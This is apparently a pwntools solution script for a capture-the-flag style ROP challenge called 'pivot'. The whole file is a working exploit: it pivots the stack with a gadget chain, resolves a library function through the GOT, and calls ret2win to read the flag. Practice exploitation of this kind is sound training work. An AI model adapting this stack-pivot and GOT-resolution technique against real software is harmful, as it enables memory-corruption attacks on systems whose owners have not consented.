from pwn import *

LIBRARY = "./libpivot.so"
BINARY = "./pivot"
LIB = ELF(LIBRARY)
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY
p = process(BINARY)

pop_rax         = p64(0x4009BB) # pop rax ; ret
call_rax        = p64(0x4006b0) # call rax
pop_rbp         = p64(0x4007c8) # pop rbp ; ret
xchg_rax_rsp    = p64(0x4009BD) # xchg rax, rsp
mov_rax_ptr_rax = p64(0x4009C0) # mov rax, [rax]
add_rax_rbp     = p64(0x4009C4) # add rax, rbp

foothold_plt    = ELF.symbols.plt['foothold_function']
foothold_got    = ELF.symbols.got['foothold_function']
log.success(f"foothold_function in PLT : {hex(foothold_plt)}")
log.success(f"foothold_function in GOT : {hex(foothold_got)}")

offset_foothold_ret2win = LIB.symbols['ret2win'] - LIB.symbols['foothold_function']
log.success(f"OFFSET FROM foothold_function TO ret2win : {hex(offset_foothold_ret2win)}")

pivot_adr = p.recvuntil(b"Send a ROP chain now and it will land there\n> ").split(b'\n')[4].split(b' ')[-1]
pivot_adr = int(pivot_adr, 16)
log.success(f"PIVOT ADDRESS = {hex(pivot_adr)}")

# STEP 1 - Pivot to the first input (where our ROPchain will me stocked)
# --> set ESP to the ROPchain's address
pivot = b"A" * 40
pivot += pop_rax
pivot += p64(pivot_adr)
pivot += xchg_rax_rsp

# SETP 2 - ret2win
# Calling foothold_function from to populate the GOT
rop = p64(foothold_plt)

# Resolving address of foothold_function in the library by deferencing the GOT pointer
rop += pop_rax
rop += p64(foothold_got)
rop += mov_rax_ptr_rax

# Calling ret2win by adding the offset to the foothold_function address
rop += pop_rbp
rop += p64(offset_foothold_ret2win)
rop += add_rax_rbp
rop += call_rax

#pause() # pause the execution to observe what's going on via a debugger : gdb -p <pid>
p.sendline(rop)
p.recvuntil(b"Now please send your stack smash\n> ")
p.sendline(pivot)

log.success(f"PIVOT chain = {pivot}")
log.success(f"ROPchain = {rop}")

flag = p.recv().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
